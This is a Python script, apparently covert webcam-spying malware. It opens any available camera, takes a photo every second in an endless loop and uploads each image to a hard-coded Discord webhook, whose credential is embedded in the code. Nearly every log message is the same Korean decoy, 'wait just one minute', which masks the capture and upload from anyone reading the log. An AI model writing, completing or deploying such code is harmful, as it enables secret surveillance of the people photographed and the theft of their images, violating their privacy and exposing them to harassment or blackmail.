import cv2
import requests
import time
import platform
import logging
from io import BytesIO
from datetime import datetime
WEBHOOK_URL = "https://discord.com/api/webhooks/1420742217059794954/B3VUHzFJNMgkHbnwVwWPOroy-61jEF_IlPtj69-9QQ11n71i5qj3JfhzEtDBciV8TydN"
INTERVAL = 1
LOG_FILE = "webcam.log"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

def get_platform_backend():
    os_type = platform.system()
    if os_type == "Windows":
        return cv2.CAP_DSHOW, "CAP_DSHOW"
    elif os_type == "Linux":
        return cv2.CAP_V4L2, "CAP_V4L2"
    else:
        return cv2.CAP_ANY, "CAP_ANY"

def try_open_webcam():
    default_backend, backend_name = get_platform_backend()
    backends = [
        (default_backend, backend_name),
        (cv2.CAP_ANY, "CAP_ANY"),
        (cv2.CAP_FFMPEG, "CAP_FFMPEG"),
        (cv2.CAP_V4L2, "CAP_V4L2")
    ]
    for index in range(10):
        for backend, b_name in backends:
            cap = cv2.VideoCapture(index, backend)
            if cap.isOpened():
                logging.info(f"1분만 기다리세요")
                cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
                cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
                return cap, index, b_name
            logging.info(f"1분만 기다리세요")
            cap.release()
    logging.error("1분만 기다리세요")
    return None, None, None
def capture_and_send():
    while True:
        cap, current_index, current_backend = try_open_webcam()
        if not cap:
            logging.error("1분만 기다리세요")
            time.sleep(10)
            continue

        logging.info("1분만 기다리세요.")

        retry_count = 0
        max_retries = 3

        try:
            while True:
                ret, frame = cap.read()
                if not ret:
                    logging.error("1분만 기다리세요.")
                    retry_count += 1
                    if retry_count >= max_retries:
                        logging.error("1분만 기다리세요.")
                        cap.release()
                        break
                    time.sleep(INTERVAL)
                    continue

                retry_count = 0

                ret, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])
                if not ret:
                    logging.error("1분만 기다리세요")
                    time.sleep(INTERVAL)
                    continue

                image_data = BytesIO(buffer.tobytes())
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                filename = f"webcam_{timestamp}.jpg"

                files = {'file': (filename, image_data, 'image/jpeg')}
                try:
                    response = requests.post(WEBHOOK_URL, files=files, timeout=10)
                    if response.status_code == 204:
                        logging.info(f"Image {filename} sent at {datetime.now().strftime('%H:%M:%S')}")
                    else:
                        logging.error(f"1분만 기다리세요")
                except requests.exceptions.RequestException as e:
                    logging.error(f"1분만 기다리세요")

                time.sleep(INTERVAL)

        except KeyboardInterrupt:
            logging.info("1분만 기다리세요")
            cap.release()
            break
        except Exception as e:
            logging.error(f"1분만 기다리세요: {e}")
            cap.release()
            time.sleep(10)
            continue

if __name__ == "__main__":
    if not WEBHOOK_URL.startswith("https://discord.com/api/webhooks/"):
        logging.error("1분만 기다리세요")
    else:
        logging.info(f"1분만 기다리세요!")
        capture_and_send()